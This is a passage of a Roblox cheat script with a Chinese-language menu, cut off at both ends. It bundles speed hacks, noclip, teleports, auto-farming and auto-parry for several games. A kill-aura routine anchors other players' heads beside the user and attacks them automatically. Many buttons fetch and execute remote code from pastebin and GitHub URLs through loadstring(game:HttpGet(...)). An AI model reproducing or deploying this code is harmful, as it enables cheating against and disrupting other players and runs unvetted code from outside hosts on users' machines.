			tpwalking = true
			local chr = game.Players.LocalPlayer.Character
			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
			while tpwalking and hb:Wait() and chr and hum and hum.Parent do
				if hum.MoveDirection.Magnitude > 0 then
					chr:TranslateBy(hum.MoveDirection)
				end
			end

		end)
		end
		end
end)
mine.MouseButton1Down:connect(function()
	if speeds == 1 then
		speed.Text = 'can not be less than 1'
		wait(1)
		speed.Text = speeds
	else
	speeds = speeds - 1
		speed.Text = speeds
		if nowe == true then
	tpwalking = false
	for i = 1, speeds do
		spawn(function()

			local hb = game:GetService("RunService").Heartbeat	


			tpwalking = true
			local chr = game.Players.LocalPlayer.Character
			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
			while tpwalking and hb:Wait() and chr and hum and hum.Parent do
				if hum.MoveDirection.Magnitude > 0 then
					chr:TranslateBy(hum.MoveDirection)
				end
			end

		end)
		end
		end
		end
end)
end)

tool:Button("工具包",function()
        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
end)

tool:Button("穿墙",function(Value)
        if Value then
      Noclip = true
      Stepped = game.RunService.Stepped:Connect(function()
        if Noclip == true then
          for a, b in pairs(game.Workspace:GetChildren()) do
            if b.Name == game.Players.LocalPlayer.Name then
              for i, v in pairs(game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                  v.CanCollide = false
                end
              end
            end
          end
         else
          Stepped:Disconnect()
        end
      end)
     else
      Noclip = false
    end
end)

tool:Button("飞车",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/MHE1cbWF"))()
end)

tool:Button("无限跳",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
end)

tool:Button("1×1×1",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/XR4sGcgJ"))()
end)

tool:Button("跑墙",function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

local creds = window:Tab("DOORS",'6035145364')

local tool = creds:section("功能",true)

tool:Button("screech抱枕 pss~",function()
        print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/iRvZnnke'))()
end)

tool:Button("穿墙",function()
        loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
end)

tool:Toggle("夜视",function(Value)
		if Value then
		    game.Lighting.Ambient = Color3.new(1, 1, 1)
		else
		    game.Lighting.Ambient = Color3.new(0, 0, 0)
		end
end)

tool:Button("手电筒",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Normal%20Flashlight"))()
end)

tool:Button("神圣炸弹",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/HolyGrenadeByNerd.lua"))()
end)

tool:Button("每一道门闪灯",function()
        local Data = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game)
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
        firesignal(game.ReplicatedStorage.Bricks.UseEventModule.OnClientEvent, "flickerLights", game.ReplicatedStorage.GameData.LatestRoom.Value, 1) 
        end)
end)

tool:Button("每一道门心跳小游戏",function()
        local Data = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game)
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()
        game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
        firesignal(game.ReplicatedStorage.Bricks.ClutchHeartbeat.OnClientEvent) 
        end)
end)

tool:Button("SC十字架",function()
loadstring(game:HttpGet("https://pastebin.com/raw/W1AzELhb"))()
end)

tool:Button("十字架封印一切按q使用",function()
        _G.Uses = 10000
_G.Range = 999
_G.OnAnything = true
_G.Fail = false
loadstring(game:HttpGet('https://raw.githubusercontent.com/PenguinManiack/Crucifix/main/Crucifix.lua'))()
end)

local creds = window:Tab("刀刃球",'6035145364')

local tool = creds:section("功能",true)

tool:Button("自动格挡",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry%20V4.0.0",true))()
end)

local creds = window:Tab("BF",'6035145364')

local tool = creds:section("功能",true)

tool:Button("刷钱（会假被踢重进就行）",function()
        local ScreenGui = Instance.new("ScreenGui")

local Frame = Instance.new("Frame")

local Frame_2 = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local Players = game.Players
local Player = Players.LocalPlayer




ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
Frame.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
Frame.Position = UDim2.new(0.00891530514, 0, 0.0973053873, 0)
Frame.Size = UDim2.new(0, 175, 0, 9)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame_2.BorderColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame_2.Position = UDim2.new(-0.0025132671, 0, 0.999667346, 0)
Frame_2.Size = UDim2.new(0, 175, 0, 164)

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton.Position = UDim2.new(0.0482275374, 0, 0.0366036035, 0)
TextButton.Size = UDim2.new(0, 159, 0, 46)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "常见的"
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.TextSize = 14
TextButton.MouseButton1Click:Connect(function()

for i,v in pairs(game:GetDescendants()) do
if v.Name == "TouchInterest"  and v.Parent.Name == "Chest1" then
Player.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
wait(0.9)
end
end

end)

TextButton_2.Parent = Frame_2
TextButton_2.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_2.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_2.Position = UDim2.new(0.0482275374, 0, 0.353676766, 0)
TextButton_2.Size = UDim2.new(0, 159, 0, 46)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "不常见的"
TextButton_2.TextColor3 = Color3.new(0, 0, 0)
TextButton_2.TextSize = 14
TextButton_2.MouseButton1Click:Connect(function()

for i,v in pairs(game:GetDescendants()) do
if v.Name == "TouchInterest"  and v.Parent.Name == "Chest2" then
Player.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
wait(0.9)
end
end


end)

TextButton_3.Parent = Frame_2
TextButton_3.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_3.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_3.Position = UDim2.new(0.0482275374, 0, 0.676847458, 0)
TextButton_3.Size = UDim2.new(0, 159, 0, 46)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "稀有的"
TextButton_3.TextColor3 = Color3.new(0, 0, 0)
TextButton_3.TextSize = 14
TextButton_3.MouseButton1Click:Connect(function()

for i,v in pairs(game:GetDescendants()) do
if v.Name == "TouchInterest"  and v.Parent.Name == "Chest3" then
Player.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
wait(0.9)
end
end


end)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
TextLabel.Position = UDim2.new(-0.299656123, 0, 19.1475391, 0)
TextLabel.Size = UDim2.new(0, 175, 0, 27)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "繁星"
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 14
end)


local creds = window:Tab("监狱人生",'6035145364')

local tool = creds:section("功能（传送）",true)

tool:Button("（警卫室）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(847.7261352539062, 98.95999908447266, 2267.387451171875)
end)
tool:Button("（监狱内）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(919.2575073242188, 98.95999908447266, 2379.74169921875)
end)
tool:Button("（罪犯复活点）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-937.5891723632812, 93.09876251220703, 2063.031982421875)
end)
tool:Button("（监狱外）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(760.6033325195312, 96.96992492675781, 2475.405029296875)
end)
local creds = window:Tab("忍者传奇",'6035145364')

local tool = creds:section("功能（传送）",true)
tool:Button("（出生点）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(25.665502548217773, 3.4228405952453613, 29.919952392578125)
end)
tool:Button("（附魔岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(51.17238235473633, 766.1807861328125, -138.44842529296875)
end)
tool:Button("（神秘岛）",function()
        		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(171.97178649902344, 4047.380859375, 42.0699577331543)
end)
tool:Button("（太空岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.83824157714844, 5657.18505859375, 73.5014877319336)
end)
tool:Button("（冻土岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(139.28330993652344, 9285.18359375, 77.36406707763672)
end)
tool:Button("（永恒岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(149.34817504882812, 13680.037109375, 73.3861312866211)
end)
tool:Button("（沙暴岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(133.37144470214844, 17686.328125, 72.00334167480469)
end)
tool:Button("（雷暴岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(143.19349670410156, 24070.021484375, 78.05432891845703)
end)
tool:Button("（远古炼狱岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.27163696289062, 28256.294921875, 69.3790283203125)
end)
tool:Button("（午夜暗影岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(132.74267578125, 33206.98046875, 57.495574951171875)
end)
tool:Button("（神秘灵魂岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.76148986816406, 39317.5703125, 61.06639862060547)
end)
tool:Button("（冬季岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.2720184326172, 46010.5546875, 55.941951751708984)
end)
tool:Button("（黄金大师岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(128.32339477539062, 52607.765625, 56.69411849975586)
end)
tool:Button("（龙传奇岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(146.35226440429688, 59594.6796875, 77.53300476074219)
end)
tool:Button("（赛博传奇岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.3321075439453, 66669.1640625, 72.21722412109375)
end)
tool:Button("（天岚超能岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.48077392578125, 70271.15625, 57.02311325073242)
end)
tool:Button("（混沌传奇岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.58590698242188, 74442.8515625, 69.3177719116211)
end)

local tool = creds:section("功能（传送）2",true)
tool:Button("（黑暗元素岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.697265625, 83198.984375, 72.73107147216797)
end)
tool:Button("（内心和平岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.3157501220703, 87051.0625, 66.78429412841797)
end)
tool:Button("（漩涡炽热岛）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.08216857910156, 91246.0703125, 69.56692504882812)
end)
local tool = creds:section("功能（传送）2",true)
tool:Button("（快捷＜超多功能>）",function()
        	local ada=Instance.new("ScreenGui")
local bda=Instance.new("Frame")local cda=Instance.new("TextButton")
local dda=Instance.new("TextButton")local __b=Instance.new("TextButton")
local a_b=Instance.new("TextButton")local b_b=Instance.new("TextButton")
local c_b=Instance.new("TextButton")local d_b=Instance.new("TextButton")
local _ab=Instance.new("TextButton")local aab=Instance.new("TextButton")
local bab=Instance.new("TextButton")local cab=Instance.new("TextButton")
local dab=Instance.new("TextButton")local _bb=Instance.new("TextButton")
local abb=Instance.new("TextButton")local bbb=Instance.new("TextButton")
local cbb=Instance.new("TextButton")local dbb=Instance.new("TextButton")
local _cb=Instance.new("TextButton")local acb=Instance.new("TextButton")
local bcb=Instance.new("TextButton")local ccb=Instance.new("TextLabel")
ada.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")bda.Parent=ada;bda.BackgroundColor3=Color3.new(1,1,1)
bda.BorderSizePixel=4;bda.Position=UDim2.new(0.19525066,0,0.497435898,0)
bda.Size=UDim2.new(0,504,0,304)cda.Parent=bda
cda.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
cda.BorderColor3=Color3.new(0.0627451,0.501961,0.00392157)cda.BorderSizePixel=3
cda.Position=UDim2.new(0.0218253974,0,0.914473712,0)cda.Size=UDim2.new(0,65,0,18)
cda.Font=Enum.Font.GothamBold;cda.Text="重置"cda.TextColor3=Color3.new(0,0,0)
cda.TextSize=18;dda.Parent=bda
dda.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
dda.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)dda.BorderSizePixel=3
dda.Position=UDim2.new(0.174603179,0,0.914473712,0)dda.Size=UDim2.new(0,106,0,21)
dda.Font=Enum.Font.GothamBold;dda.Text="自动坏人"dda.TextColor3=Color3.new(0,0,0)
dda.TextSize=14;__b.Parent=bda
__b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
__b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)__b.BorderSizePixel=3
__b.Position=UDim2.new(0.412698418,0,0.917763174,0)__b.Size=UDim2.new(0,42,0,21)
__b.Font=Enum.Font.GothamBold;__b.Text="OFF"__b.TextColor3=Color3.new(0,0,0)__b.TextSize=14
a_b.Parent=bda
a_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
a_b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)a_b.BorderSizePixel=3
a_b.Position=UDim2.new(0.521825373,0,0.914473712,0)a_b.Size=UDim2.new(0,106,0,21)
a_b.Font=Enum.Font.GothamBold;a_b.Text="自动好人"a_b.TextColor3=Color3.new(0,0,0)
a_b.TextSize=14;b_b.Parent=bda
b_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
b_b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)b_b.BorderSizePixel=3
b_b.Position=UDim2.new(0.759920597,0,0.917763174,0)b_b.Size=UDim2.new(0,42,0,21)
b_b.Font=Enum.Font.GothamBold;b_b.Text="OFF"b_b.TextColor3=Color3.new(0,0,0)b_b.TextSize=14
c_b.Parent=bda
c_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
c_b.BorderColor3=Color3.new(0.0627451,0.501961,0.00392157)c_b.BorderSizePixel=3
c_b.Position=UDim2.new(0.0238095243,0,0.802631557,0)c_b.Size=UDim2.new(0,65,0,18)
c_b.Font=Enum.Font.GothamBold;c_b.Text="最大JP"c_b.TextColor3=Color3.new(0,0,0)
c_b.TextSize=18;d_b.Parent=bda
d_b.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
d_b.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)d_b.BorderSizePixel=3
d_b.Position=UDim2.new(0.174603179,0,0.799342096,0)d_b.Size=UDim2.new(0,106,0,21)
d_b.Font=Enum.Font.GothamBold;d_b.Text="无限隐身"d_b.TextColor3=Color3.new(0,0,0)
d_b.TextSize=14;_ab.Parent=bda
_ab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
_ab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)_ab.BorderSizePixel=3
_ab.Position=UDim2.new(0.521825373,0,0.799342096,0)_ab.Size=UDim2.new(0,106,0,21)
_ab.Font=Enum.Font.GothamBold;_ab.Text="解锁所有岛屿"_ab.TextColor3=Color3.new(0,0,0)
_ab.TextSize=14;aab.Parent=bda
aab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
aab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)aab.BorderSizePixel=3
aab.Position=UDim2.new(0.176587299,0,0.684210539,0)aab.Size=UDim2.new(0,106,0,21)
aab.Font=Enum.Font.GothamBold;aab.Text="删除通知"aab.TextColor3=Color3.new(0,0,0)
aab.TextSize=10;bab.Parent=bda
bab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
bab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)bab.BorderSizePixel=3
bab.Position=UDim2.new(0.521825373,0,0.684210539,0)bab.Size=UDim2.new(0,106,0,21)
bab.Font=Enum.Font.GothamBold;bab.Text="大领袖全部"bab.TextColor3=Color3.new(0,0,0)
bab.TextSize=14;cab.Parent=bda
cab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
cab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)cab.BorderSizePixel=3
cab.Position=UDim2.new(0.0297619049,0,0.575657904,0)cab.Size=UDim2.new(0,106,0,21)
cab.Font=Enum.Font.GothamBold;cab.Text="自动摆剑"cab.TextColor3=Color3.new(0,0,0)
cab.TextSize=15;dab.Parent=bda
dab.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
dab.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)dab.BorderSizePixel=3
dab.Position=UDim2.new(0.267857134,0,0.575657904,0)dab.Size=UDim2.new(0,106,0,21)
dab.Font=Enum.Font.GothamBold;dab.Text="自动出售"dab.TextColor3=Color3.new(0,0,0)
dab.TextSize=15;_bb.Parent=bda
_bb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
_bb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)_bb.BorderSizePixel=3
_bb.Position=UDim2.new(0.509920657,0,0.575657904,0)_bb.Size=UDim2.new(0,106,0,21)
_bb.Font=Enum.Font.GothamBold;_bb.Text="自动全额出售"_bb.TextColor3=Color3.new(0,0,0)
_bb.TextSize=15;abb.Parent=bda
abb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
abb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)abb.BorderSizePixel=3
abb.Position=UDim2.new(0.75,0,0.575657904,0)abb.Size=UDim2.new(0,106,0,21)
abb.Font=Enum.Font.GothamBold;abb.Text="快摆"abb.TextColor3=Color3.new(0,0,0)
abb.TextSize=15;bbb.Parent=bda
bbb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
bbb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)bbb.BorderSizePixel=3
bbb.Position=UDim2.new(0.0317460336,0,0.450657904,0)bbb.Size=UDim2.new(0,106,0,21)
bbb.Font=Enum.Font.GothamBold;bbb.Text="机器人攻击"bbb.TextColor3=Color3.new(0,0,0)
bbb.TextSize=15;cbb.Parent=bda
cbb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
cbb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)cbb.BorderSizePixel=3
cbb.Position=UDim2.new(0.267857134,0,0.453947365,0)cbb.Size=UDim2.new(0,106,0,21)
cbb.Font=Enum.Font.GothamBold;cbb.Text="永恒攻击"cbb.TextColor3=Color3.new(0,0,0)
cbb.TextSize=15;dbb.Parent=bda
dbb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
dbb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)dbb.BorderSizePixel=3
dbb.Position=UDim2.new(0.511904776,0,0.450657904,0)dbb.Size=UDim2.new(0,106,0,21)
dbb.Font=Enum.Font.GothamBold;dbb.Text="自动跳圈"dbb.TextColor3=Color3.new(0,0,0)
dbb.TextSize=15;_cb.Parent=bda
_cb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
_cb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)_cb.BorderSizePixel=3
_cb.Position=UDim2.new(0.75,0,0.447368413,0)_cb.Size=UDim2.new(0,106,0,21)
_cb.Font=Enum.Font.GothamBold;_cb.Text="自动升级宠物"_cb.TextColor3=Color3.new(0,0,0)
_cb.TextSize=15;acb.Parent=bda
acb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
acb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)acb.BorderSizePixel=3
acb.Position=UDim2.new(0.0317460336,0,0.338815778,0)acb.Size=UDim2.new(0,106,0,21)
acb.Font=Enum.Font.GothamBold;acb.Text="无限宠物"acb.TextColor3=Color3.new(0,0,0)
acb.TextSize=15;bcb.Parent=bda
bcb.BackgroundColor3=Color3.new(0.501961,0.501961,0.0117647)
bcb.BorderColor3=Color3.new(0.0627451,0.501961,0.25098)bcb.BorderSizePixel=3
bcb.Position=UDim2.new(0.271825403,0,0.342105269,0)bcb.Size=UDim2.new(0,106,0,21)
bcb.Font=Enum.Font.GothamBold;bcb.Text="宠物故障"bcb.TextColor3=Color3.new(0,0,0)
bcb.TextSize=15;ccb.Parent=bda;ccb.BackgroundColor3=Color3.new(1,1,1)
ccb.BackgroundTransparency=1
ccb.Position=UDim2.new(-0.242063493,0,-0.016447369,0)ccb.Size=UDim2.new(0,753,0,50)
ccb.Font=Enum.Font.GothamBold;ccb.Text="繁星忍者传奇"
ccb.TextColor3=Color3.new(0,0,0)ccb.TextSize=35;ccb.TextWrapped=true;local function dcb()
local acc=Instance.new('LocalScript',ada)frame=acc.Parent.Frame;frame.Draggable=true;frame.Active=true
frame.Selectable=true end
coroutine.wrap(dcb)()
local function _db()local acc=Instance.new('LocalScript',bda)
while true do
acc.Parent.BackgroundColor3=Color3.fromRGB(157,255,198)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(108,255,243)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(103,169,255)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(123,97,255)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(214,90,255)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,87,205)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,80,83)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,138,84)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,235,83)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(16,128,64)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,235,83)end end;coroutine.wrap(_db)()
local function adb()
local acc=Instance.new('LocalScript',cda)function onButtonClicked()
game.Players.LocalPlayer.Character.Humanoid.Health=0 end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(adb)()
local function bdb()
local acc=Instance.new('LocalScript',dda)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Bad"local adc=""local bdc=""
_G.Enabled=true
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(bdb)()
local function cdb()
local acc=Instance.new('LocalScript',__b)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Bad"local adc=""local bdc=""
_G.Enabled=false
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(cdb)()
local function ddb()
local acc=Instance.new('LocalScript',a_b)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Good"local adc=""local bdc=""
_G.Enabled=true
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
